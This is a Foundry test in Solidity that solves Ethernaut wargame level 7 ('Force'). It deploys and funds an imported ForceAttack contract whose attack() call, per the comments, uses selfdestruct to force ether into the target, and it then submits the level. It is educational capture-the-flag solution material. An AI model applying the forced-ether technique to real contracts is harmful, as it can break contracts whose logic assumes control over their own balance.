// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/07-Force/ForceFactory.sol";
import "src/levels/07-Force/ForceAttack.sol";
import "src/core/Ethernaut.sol";

contract ForceTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Force level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testForceExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        ForceFactory forceFactory = new ForceFactory();

        ethernaut.registerLevel(forceFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force forceContract = Force(payable(levelAddress));

        // emit log_named_address(
        //     "The original owner of the contract: ",
        //     forceContract.owner()
        // );
        emit log_named_address(
            "Address of the exploit contract: ",
            address(this)
        );
        emit log_named_address("Attacker's address: ", address(attacker));

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/
        // Attacker creates the malicious contract that will contain `attack` function that trigger `selfdestruct` and specify the address of the `Force` contract as the target.
        ForceAttack forceAttack = new ForceAttack(levelAddress);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // Attacker funds the malicious contract with any amount of Ether.
        emit log_string("Funding the ForceAttack contract with 1 eth");
        vm.deal(address(forceAttack), 1 ether);

        emit log_named_uint(
            "ForceAttack contract balance (before attack): ",
            address(forceAttack).balance
        );
        emit log_named_uint(
            "Exploited contract balance (before attack): ",
            address(forceContract).balance
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // Attacker calls the `attack` function from the malicious contract.
        emit log_string("Starting the exploit...");
        forceAttack.attack();

        emit log_named_uint(
            "ForceAttack contract balance (after attack): ",
            address(forceAttack).balance
        );

        // The balance of the `Force` contract is increased.
        emit log_named_uint(
            "Exploited contract balance (after attack): ",
            address(forceContract).balance
        );

        // Test assertion
        assertGe(address(forceContract).balance, 0);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
